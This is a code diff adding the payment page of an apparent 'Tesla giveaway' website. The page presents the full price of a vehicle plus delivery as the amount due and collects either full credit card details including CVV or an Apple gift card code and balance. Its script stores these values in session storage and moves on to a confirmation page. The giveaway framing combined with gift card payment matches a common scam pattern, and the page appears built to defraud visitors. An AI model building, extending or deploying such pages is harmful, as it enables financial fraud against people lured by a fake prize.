@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment - Secure Checkout</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo">⚡ TESLA GIVEAWAY</div>
+            <ul class="nav-menu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li><a href="gallery.html" class="nav-link">Gallery</a></li>
+                <li><a href="claim.html" class="nav-link">Claim</a></li>
+                <li><a href="deliveries.html" class="nav-link">Deliveries</a></li>
+                <li><a href="info.html" class="nav-link">Info</a></li>
+                <li><a href="instructions.html" class="nav-link">Help</a></li>
+            </ul>
+            <div class="hamburger"><span></span><span></span><span></span></div>
+        </div>
+    </nav>
+
+    <section class="page-header">
+        <h1>Secure Payment</h1>
+        <p>Select your payment method and complete your order</p>
+    </section>
+
+    <section class="payment-section">
+        <div class="payment-container">
+            <div class="payment-summary">
+                <h2>Order Total</h2>
+                <div id="paymentDetails"></div>
+                <div class="summary-total">
+                    <h3>Total Amount Due: <span id="paymentTotal">$0.00</span></h3>
+                </div>
+            </div>
+
+            <div class="payment-form">
+                <h2>Select Payment Method</h2>
+                <div class="radio-group">
+                    <label class="radio-option">
+                        <input type="radio" name="paymentMethod" value="creditcard" checked>
+                        <div><span>💳 Credit Card</span><p>Visa, Mastercard, American Express</p></div>
+                    </label>
+                    <label class="radio-option">
+                        <input type="radio" name="paymentMethod" value="applegift">
+                        <div><span>🎁 Apple Gift Card</span><p>Use Apple Gift Card for payment</p></div>
+                    </label>
+                </div>
+            </div>
+
+            <div class="payment-form" id="creditCardForm">
+                <h2>Credit Card Information</h2>
+                <form id="paymentFormCC">
+                    <div class="form-group">
+                        <label for="cardName">Cardholder Name *</label>
+                        <input type="text" id="cardName" required placeholder="John Doe">
+                    </div>
+                    <div class="form-group">
+                        <label for="cardNumber">Card Number *</label>
+                        <input type="text" id="cardNumber" required placeholder="1234 5678 9012 3456" maxlength="19">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="expiry">Expiry Date (MM/YY) *</label>
+                            <input type="text" id="expiry" required placeholder="12/26" maxlength="5">
+                        </div>
+                        <div class="form-group">
+                            <label for="cvv">CVV *</label>
+                            <input type="text" id="cvv" required placeholder="123" maxlength="4">
+                        </div>
+                    </div>
+                    <div class="form-group checkbox">
+                        <input type="checkbox" id="agreePayment" required>
+                        <label for="agreePayment">I agree to the payment terms *</label>
+                    </div>
+                    <div class="payment-buttons">
+                        <button type="button" class="btn btn-secondary" onclick="navigateTo('checkout.html')">← Back</button>
+                        <button type="submit" class="btn btn-primary btn-large">Pay Now ✓</button>
+                    </div>
+                </form>
+            </div>
+
+            <div class="payment-form" id="giftCardForm" style="display:none;">
+                <h2>Apple Gift Card Payment</h2>
+                <form id="paymentFormGift">
+                    <div class="form-group">
+                        <label for="giftCardCode">Enter Gift Card Code *</label>
+                        <input type="text" id="giftCardCode" required placeholder="XXXX-XXXX-XXXX-XXXX">
+                    </div>
+                    <div class="form-group">
+                        <label for="giftCardAmount">Gift Card Balance *</label>
+                        <input type="number" id="giftCardAmount" required placeholder="Amount" step="0.01">
+                    </div>
+                    <div class="form-group checkbox">
+                        <input type="checkbox" id="agreeGiftCard" required>
+                        <label for="agreeGiftCard">I agree to the payment terms *</label>
+                    </div>
+                    <div class="payment-buttons">
+                        <button type="button" class="btn btn-secondary" onclick="navigateTo('checkout.html')">← Back</button>
+                        <button type="submit" class="btn btn-primary btn-large">Confirm Payment ✓</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p>&copy; 2026 Tesla Car Giveaway</p>
+    </footer>
+
+    <script src="app.js"></script>
+    <script>
+        const VEHICLE_PRICES = {
+            'Tesla Model 3 2025': 42990, 'Tesla Model Y 2025': 45990, 'Tesla Model S 2025': 79990,
+            'Tesla Model X 2025': 84990, 'Tesla Model Y LR 2025': 65990, 'Tesla Cybertruck 2025': 60990,
+            'Tesla Roadster': 200000, 'Tesla Model S Plaid': 109990, 'Tesla Model X Plaid': 104990,
+            'Tesla Model Y Performance': 75990
+        };
+        const DELIVERY_FEES = {'standard': 299, 'express': 349, 'premium': 399};
+
+        window.addEventListener('DOMContentLoaded', function() {
+            const orderData = getFormData();
+            const deliveryMethod = sessionStorage.getItem('deliveryMethod') || 'standard';
+            if (!orderData) { navigateTo('claim.html'); return; }
+
+            const vehiclePrice = VEHICLE_PRICES[orderData.vehicle] || 50000;
+            const deliveryFee = DELIVERY_FEES[deliveryMethod] || 299;
+            const total = vehiclePrice + deliveryFee;
+
+            document.getElementById('paymentTotal').textContent = '$' + total.toLocaleString();
+            document.getElementById('paymentDetails').innerHTML = `
+                <div class="summary-item"><span>${orderData.vehicle}</span><strong>$${vehiclePrice.toLocaleString()}</strong></div>
+                <div class="summary-item"><span>Delivery (${deliveryMethod})</span><strong>$${deliveryFee.toLocaleString()}</strong></div>
+            `;
+        });
+
+        document.querySelectorAll('input[name="paymentMethod"]').forEach(radio => {
+            radio.addEventListener('change', function() {
+                const ccForm = document.getElementById('creditCardForm');
+                const gcForm = document.getElementById('giftCardForm');
+                if (this.value === 'creditcard') {
+                    ccForm.style.display = 'block';
+                    gcForm.style.display = 'none';
+                } else {
+                    ccForm.style.display = 'none';
+                    gcForm.style.display = 'block';
+                }
+            });
+        });
+
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formatted;
+        });
+
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('paymentFormCC').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const paymentData = {
+                method: 'creditcard',
+                cardName: document.getElementById('cardName').value,
+                cardLast4: document.getElementById('cardNumber').value.slice(-4),
+                expiry: document.getElementById('expiry').value
+            };
+            sessionStorage.setItem('paymentData', JSON.stringify(paymentData));
+            navigateTo('confirmation.html');
+        });
+
+        document.getElementById('paymentFormGift').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const paymentData = {
+                method: 'applegift',
+                giftCardCode: document.getElementById('giftCardCode').value
+            };
+            sessionStorage.setItem('paymentData', JSON.stringify(paymentData));
+            navigateTo('confirmation.html');
+        });
+    </script>
+</body>
+</html>
